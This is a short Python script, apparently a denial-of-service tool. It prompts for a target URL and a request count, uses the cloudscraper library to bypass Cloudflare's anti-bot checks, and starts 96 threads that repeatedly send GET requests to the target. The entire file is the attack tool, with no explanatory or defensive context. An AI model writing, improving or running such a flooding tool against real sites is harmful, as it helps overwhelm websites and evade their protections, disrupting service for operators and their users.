import requests
import io
import threading
import cloudscraper

class bypass:
    def __init__(self):
        print('URL:')
        self.atk_url = input()
        print('Requests')
        self.req_max = input()
        self.req_max = int(self.req_max)
        self.scraper = cloudscraper.create_scraper()
        self.start()
        

    def start(self):
        t1 = threading.Thread(target=self.multi, args=())
        t2 = threading.Thread(target=self.multi, args=())
        t3 = threading.Thread(target=self.multi, args=())
        t4 = threading.Thread(target=self.multi, args=())
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t1.join()
        t2.join()
        t3.join()
        t4.join()

    def multi(self):
        t1 = threading.Thread(target=self.threads, args=('t1',))
        t2 = threading.Thread(target=self.threads, args=('t2',))
        t3 = threading.Thread(target=self.threads, args=('t3',))
        t4 = threading.Thread(target=self.threads, args=('t4',))
        t5 = threading.Thread(target=self.threads, args=('t5',))
        t6 = threading.Thread(target=self.threads, args=('t6',))
        t7 = threading.Thread(target=self.threads, args=('t7',))
        t8 = threading.Thread(target=self.threads, args=('t8',))

        t9 = threading.Thread(target=self.threads, args=('t1',))
        t10 = threading.Thread(target=self.threads, args=('t2',))
        t11 = threading.Thread(target=self.threads, args=('t3',))
        t12 = threading.Thread(target=self.threads, args=('t4',))
        t13 = threading.Thread(target=self.threads, args=('t5',))
        t14 = threading.Thread(target=self.threads, args=('t6',))
        t15 = threading.Thread(target=self.threads, args=('t7',))
        t16 = threading.Thread(target=self.threads, args=('t8',))

        t17 = threading.Thread(target=self.threads, args=('t1',))
        t18 = threading.Thread(target=self.threads, args=('t2',))
        t19 = threading.Thread(target=self.threads, args=('t3',))
        t20 = threading.Thread(target=self.threads, args=('t4',))
        t21 = threading.Thread(target=self.threads, args=('t5',))
        t22 = threading.Thread(target=self.threads, args=('t6',))
        t23 = threading.Thread(target=self.threads, args=('t7',))
        t24 = threading.Thread(target=self.threads, args=('t8',))

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
        t6.start()
        t7.start()
        t8.start()

        t9.start()
        t10.start()
        t11.start()
        t12.start()
        t13.start()
        t14.start()
        t15.start()
        t16.start()

        t17.start()
        t18.start()
        t19.start()
        t20.start()
        t21.start()
        t22.start()
        t23.start()
        t24.start()

        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()
        t6.join()
        t7.join()
        t8.join()

        t9.join()
        t10.join()
        t11.join()
        t12.join()
        t13.join()
        t14.join()
        t15.join()
        t16.join()

        t17.join()
        t18.join()
        t19.join()
        t20.join()
        t21.join()
        t22.join()
        t23.join()
        t24.join()
    
    def threads(self, a):
        self.i = 0
        while self.i < self.req_max:
            response = self.scraper.get(self.atk_url)
            print(response)
            print(str(self.i) + ' :' + a)
            self.i = self.i + 1

bypass = bypass()